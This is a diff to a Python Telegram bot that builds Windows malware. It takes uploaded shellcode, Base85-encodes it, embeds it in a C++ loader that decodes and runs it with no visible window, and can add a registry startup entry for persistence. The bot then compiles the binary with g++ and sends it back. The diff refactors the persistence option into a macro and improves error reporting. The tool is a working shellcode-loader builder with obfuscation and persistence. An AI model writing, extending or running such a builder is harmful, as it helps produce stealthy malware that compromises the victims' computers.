@@ -367,7 +367,7 @@ async def get_filename(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     return GET_STARTUP_CHOICE
 
 async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Stores the startup choice, compiles with Base85, sends, cleans up, and ends."""
+    """Stores startup choice, compiles with Base85 and startup macro, sends, and cleans."""
     query = update.callback_query
     await query.answer()
 
@@ -377,7 +377,7 @@ async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE)
     output_filename = context.user_data.get('output_filename')
 
     if not input_path or not output_filename:
-        await edit_message(query, "Error: Missing data. Please start over by sending the file again.", None)
+        await edit_message(query, "Error: Missing data. Please start over.", None)
         context.user_data.clear()
         return ConversationHandler.END
 
@@ -393,15 +393,15 @@ async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE)
         encoded_shellcode = base64.b85encode(shellcode_bytes).decode('ascii')
         app_name_for_registry = os.path.splitext(output_filename)[0]
 
-        startup_line = ""
-        if startup:
-            startup_line = f'char currentPath[MAX_PATH]; GetModuleFileName(NULL, currentPath, MAX_PATH); addToStartup(\\"{app_name_for_registry}\\", currentPath);'
+        startup_macro = "#define StartUP true" if startup else "#define StartUP false"
 
         cpp_template = f'''
 #include <windows.h>
 #include <string.h>
 #include <vector>
 #include <string>
+
+{startup_macro}
 
 // Function to decode a base85 string into a vector of bytes
 std::vector<unsigned char> b85_decode(const std::string& b85_string) {{
@@ -410,7 +410,7 @@ std::vector<unsigned char> b85_decode(const std::string& b85_string) {{
     int count = 0;
 
     for (char c : b85_string) {{
-        if (c < '!' || c > 'u') continue; // Skip invalid characters
+        if (c < '!' || c > 'u') continue;
         buffer = buffer * 85 + (c - 33);
         count++;
         if (count == 5) {{
@@ -424,9 +424,7 @@ std::vector<unsigned char> b85_decode(const std::string& b85_string) {{
     }}
 
     if (count > 0) {{
-        for (int i = count; i < 5; i++) {{
-            buffer = buffer * 85 + 84;
-        }}
+        for (int i = count; i < 5; i++) buffer = buffer * 85 + 84;
         for (int i = 0; i < count - 1; i++) {{
             decoded_data.push_back((buffer >> (24 - i * 8)) & 0xFF);
         }}
@@ -446,7 +444,11 @@ void addToStartup(const char* appName, const char* appPath) {{
 const std::string b85_shellcode = "{encoded_shellcode}";
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
-    {startup_line}
+#if StartUP
+    char currentPath[MAX_PATH];
+    GetModuleFileName(NULL, currentPath, MAX_PATH);
+    addToStartup("{app_name_for_registry}", currentPath);
+#endif
 
     std::vector<unsigned char> shellcode = b85_decode(b85_shellcode);
     if (shellcode.empty()) return 1;
@@ -464,11 +466,18 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
         compile_result = subprocess.run(
             ["g++", cpp_file_path, "-o", compiled_exe_path, "-mwindows"],
-            capture_output=True, text=True
+            capture_output=True, text=True,
         )
 
         if compile_result.returncode != 0:
-            await edit_message(query, f"Compilation error:\\n{compile_result.stderr}", None)
+            error_msg = f"Compilation Error:\\n{compile_result.stderr}"
+            print(f"Compilation failed for user {uid}:\\n{error_msg}")
+
+            # Truncate for Telegram
+            if len(error_msg) > 4000:
+                error_msg = error_msg[:4000] + "\\n...(truncated)"
+
+            await edit_message(query, error_msg, None)
             return ConversationHandler.END
 
         with open(compiled_exe_path, "rb") as f:
@@ -478,8 +487,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         await edit_message(query, "✅ File created and sent successfully.", None)
 
     except Exception as e:
-        print(f"File processing error: {e}")
-        await edit_message(query, f"An error occurred while processing your file: {e}", None)
+        import traceback
+        print(f"An exception occurred for user {uid}:")
+        traceback.print_exc()
+        await edit_message(query, f"An unexpected error occurred: {e}", None)
 
     finally:
         for path in [input_path, cpp_file_path, compiled_exe_path]:
